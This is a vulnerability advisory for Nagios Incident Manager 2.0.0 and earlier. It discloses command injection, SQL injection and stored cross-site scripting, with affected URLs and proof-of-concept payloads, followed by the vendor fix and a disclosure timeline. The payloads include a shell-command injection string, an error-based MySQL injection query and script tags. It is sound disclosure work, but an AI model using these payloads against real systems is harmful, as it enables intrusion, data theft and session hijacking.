@@ -1,0 +1,124 @@
+(    , )     (,
+  .   '.' ) ('.    ',
+   ). , ('.   ( ) (
+  (_,) .'), ) _ _,
+ /  _____/  / _  \    ____  ____   _____
+ \____  \==/ /_\  \ _/ ___\/  _ \ /     \
+ /       \/   |    \\  \__(  <_> )  Y Y  \
+/______  /\___|__  / \___  >____/|__|_|  /
+        \/         \/.-.    \/         \/:wq
+                    (x.0)
+                  '=.|w|.='
+                  _=''"''=.
+
+                presents..
+
+Nagios Incident Manager Multiple Vulnerabilities
+Affected versions: Nagios Incident Manager <= 2.0.0
+
+PDF:
+http://www.security-assessment.com/files/documents/advisory/NagiosIncidentManager.pdf
+
++-----------+
+|Description|
++-----------+
+The Nagios Incident Manager application is vulnerable to multiple
+vulnerabilities, including remote code execution via command injection,
+SQL injection and stored cross-site scripting.
+
+
++------------+
+|Exploitation|
++------------+
+==Command Injection==
+Multiple command injection vulnerabilities exist within the incident
+report file generation functionality as user input is passed to system
+shell calls without validation. A limited non-administrative user, who
+by default does not have permissions to add custom MIME types for
+incident file attachments, can exploit these vulnerabilities to obtain
+remote code execution on the Incident Manager system as the ‘apache’ user.
+
+URL => /nagiosim/reports/download/<pdf|jpg>/mttr/<BASE64 PAYLOAD>
+Method => GET
+POC Payload => start_date=2016-05-06&end_date=2016-05-06&types[]=2"
+"";{touch,/tmp/MYFILE};echo
+
+URL => /nagiosim/reports/download/<pdf|jpg>/closed/<BASE64 PAYLOAD>
+Method => GET
+POC Payload => start_date=2016-05-06&end_date=2016-05-06&types[]=2"
+"";{touch,/tmp/MYFILE};echo
+
+URL => /nagiosim/reports/download/<pdf|jpg>/first_response/<BASE64 PAYLOAD>
+Method => GET
+POC Payload => start_date=2016-05-06&end_date=2016-05-06&types[]=2"
+"";{touch,/tmp/MYFILE};echo
+
+URL => /nagiosim/reports/download/<pdf|jpg>/general/<BASE64 PAYLOAD>
+Method => GET
+POC Payload => start_date=2016-05-06&end_date=2016-05-06&types[]=2"
+"";{touch,/tmp/MYFILE};echo
+
+
+==SQL Injection==
+The Nagios IM admin functionality to update the application settings is
+vulnerable to an SQL Injection vulnerability via error-based payloads.
+An attacker can inject into the ‘timezone’ POST parameter and retrieve
+sensitive information from the application MySQL database.
+
+URL => /nagiosim/admin/settings
+Method => POST
+Parameter => timezone
+Payload => Pacific/Samoa' AND (SELECT 5323 FROM(SELECT
+COUNT(*),CONCAT(0x717a7a7171,(MID((IFNULL(CAST(DATABASE() AS
+CHAR),0x20)),1,54)),0x7170786a71,FLOOR(RAND(0)*2))x FROM
+INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '
+
+
+==Stored Cross-Site Scripting==
+Multiple stored cross-scripting vulnerabilities exist in the Nagios IM
+web interface, allowing a standard user to insert malicious JavaScript
+payloads into administrative and non-administrative application
+functionality. This attack vector could be used by an authenticated
+attacker with standard user privileges to hijack the session of an admin
+user and extend their permissions within the application (e.g. adding
+PHP as a valid MIME type for file attachments).
+
+URL => /nagiosim/incidents/add
+Method => POST
+Parameters => title, summary, priority, file_description, status
+Render => /nagiosim/incidents, /nagiosim/incidents/details/<ID>
+POC Payload => <script>alert(1)</script>
+
+URL => /nagiosim/api/incidents/<ID>/messages
+Method => POST
+Parameters => title
+Render => /nagiosim/incidents/details/<ID>
+POC Payload => <script>alert(1)</script>
+
+URL => /nagiosim/profile
+Method => POST
+Parameters => username, first_name, last_name
+Render => /nagiosim/admin/users, Global Menu Banner (username)
+POC Payload => <script>alert(1)</script>
+
++----------+
+| Solution |
++----------+
+Upgrade to Nagios Incident Manager 2.0.1
+
+
++------------+
+|  Timeline  |
++------------+
+2/06/2016 - Initial disclosure to vendor
+3/06/2016 - Vendor acknowledges receipt of advisory
+8/07/2016 - Vendor releases patched software version (2.0.1)
+11/08/2016 – Public disclosure
+
+
+
++------------+
+| Additional |
++------------+
+Further information is available in the accompanying PDF.
+http://www.security-assessment.com/files/documents/advisory/NagiosIncidentManager.pdf
